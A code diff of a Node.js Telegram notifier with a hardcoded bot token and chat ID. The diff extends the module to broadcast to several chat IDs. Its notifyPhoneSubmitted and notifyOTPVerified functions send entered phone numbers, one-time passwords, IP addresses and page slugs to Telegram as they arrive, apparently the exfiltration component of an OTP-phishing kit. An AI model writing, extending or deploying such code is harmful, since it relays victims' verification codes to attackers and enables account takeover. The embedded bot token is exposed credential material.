@@ -1,7 +1,6 @@
 const https = require('https');
 const fs = require('fs');
 const path = require('path');
-const EmailSettings = require('../models/EmailSettings');
 
 const STORE_PATH = path.join(__dirname, 'telegram_store.json');
 
@@ -9,12 +8,12 @@ let botToken = '8952162506:AAHz_Jzd918IOGz5wf7wWYkB4Hglr8rhegg';
 let chatId = '934345778';
 
 /**
- * Configure Telegram Bot Token and Chat ID
+ * Configure Telegram Bot Token and Chat ID (supports comma-separated IDs)
  */
 function configureTelegram(token, id) {
     botToken = (token || '').trim();
     chatId = (id || '').trim();
-    console.log(`[TelegramNotifier] Configured Token: ${botToken ? 'YES' : 'NO'}, ChatID: ${chatId || 'NONE'}`);
+    console.log(`[TelegramNotifier] Configured Token: ${botToken ? 'YES' : 'NO'}, ChatID(s): ${chatId || 'NONE'}`);
     saveLocalFile();
     return !!(botToken && chatId);
 }
@@ -31,58 +30,64 @@ function getTelegramConfig() {
 }
 
 /**
- * Send raw HTTPS request to Telegram Bot API
+ * Send raw HTTPS request to Telegram Bot API (supports sending to multiple Chat IDs)
  */
 function sendTelegramMessage(text) {
-    return new Promise((resolve, reject) => {
-        if (!botToken || !chatId) {
-            console.log('[TelegramNotifier] Skipping Telegram alert - Bot Token or Chat ID missing.');
-            return resolve(false);
-        }
+    if (!botToken || !chatId) {
+        console.log('[TelegramNotifier] Skipping Telegram alert - Bot Token or Chat ID missing.');
+        return Promise.resolve(false);
+    }
 
-        const payload = JSON.stringify({
-            chat_id: chatId,
-            text: text,
-            parse_mode: 'HTML',
-            disable_web_page_preview: true
-        });
+    const ids = chatId.split(',').map(id => id.trim()).filter(id => id);
 
-        const req = https.request({
-            hostname: 'api.telegram.org',
-            path: `/bot${botToken}/sendMessage`,
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Content-Length': Buffer.byteLength(payload)
-            },
-            timeout: 5000 // 5s timeout
-        }, (res) => {
-            let data = '';
-            res.on('data', chunk => data += chunk);
-            res.on('end', () => {
-                try {
-                    const parsed = JSON.parse(data);
-                    if (parsed.ok) {
-                        console.log(`[TelegramNotifier] ⚡ Instant Telegram alert sent to Chat ID ${chatId}`);
-                        resolve(true);
-                    } else {
-                        console.error('[TelegramNotifier] Telegram API Error:', parsed.description);
-                        reject(new Error(parsed.description));
-                    }
-                } catch (e) {
-                    resolve(false);
-                }
+    const promises = ids.map(targetId => {
+        return new Promise((resolve) => {
+            const payload = JSON.stringify({
+                chat_id: targetId,
+                text: text,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
             });
-        });
 
-        req.on('error', (err) => {
-            console.error('[TelegramNotifier] Request error:', err.message);
-            reject(err);
-        });
+            const req = https.request({
+                hostname: 'api.telegram.org',
+                path: `/bot${botToken}/sendMessage`,
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Content-Length': Buffer.byteLength(payload)
+                },
+                timeout: 5000
+            }, (res) => {
+                let data = '';
+                res.on('data', chunk => data += chunk);
+                res.on('end', () => {
+                    try {
+                        const parsed = JSON.parse(data);
+                        if (parsed.ok) {
+                            console.log(`[TelegramNotifier] ⚡ Instant alert sent to Chat ID ${targetId}`);
+                            resolve(true);
+                        } else {
+                            console.error(`[TelegramNotifier] API Error for ${targetId}:`, parsed.description);
+                            resolve(false);
+                        }
+                    } catch (e) {
+                        resolve(false);
+                    }
+                });
+            });
 
-        req.write(payload);
-        req.end();
+            req.on('error', (err) => {
+                console.error(`[TelegramNotifier] Request error for ${targetId}:`, err.message);
+                resolve(false);
+            });
+
+            req.write(payload);
+            req.end();
+        });
     });
+
+    return Promise.all(promises);
 }
 
 /**
@@ -100,14 +105,14 @@ async function notifyPhoneSubmitted({ phoneNumber, customSlug, ipAddress, submit
                 `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
                 `⏰ <b>Time:</b> ${timeStr}`;
 
-    return sendTelegramMessage(msg).catch(err => console.error('[Telegram] Error:', err.message));
+    return sendTelegramMessage(msg);
 }
 
 /**
  * Send instant alert when OTP is submitted and verified
  */
 async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, verifiedAt }) {
-    const timeStr = new Date(verifiedAt || Date.now()).toLocaleTimeString('en-US', {
+    const timeStr = new Date(verifiedAt || Date.now()).toLocaleString('en-US', {
         hour: '2-digit', minute: '2-digit', second: '2-digit'
     });
 
@@ -119,7 +124,7 @@ async function notifyOTPVerified({ phoneNumber, otp, customSlug, ipAddress, veri
                 `🌐 <b>IP:</b> ${ipAddress || 'Unknown'}\n` +
                 `⏰ <b>Time:</b> ${timeStr}`;
 
-    return sendTelegramMessage(msg).catch(err => console.error('[Telegram] Error:', err.message));
+    return sendTelegramMessage(msg);
 }
 
 /**
@@ -135,7 +140,7 @@ async function sendTestNotification() {
 }
 
 /**
- * Load persisted settings from file or DB
+ * Load persisted settings from file
  */
 function initPersistedSettings() {
     try {
@@ -145,7 +150,7 @@ function initPersistedSettings() {
             if (data.botToken && data.chatId) {
                 botToken = data.botToken;
                 chatId = data.chatId;
-                console.log(`[TelegramNotifier] Loaded Telegram config from local file. ChatID: ${chatId}`);
+                console.log(`[TelegramNotifier] Loaded Telegram config. ChatID(s): ${chatId}`);
             }
         }
     } catch (err) {}
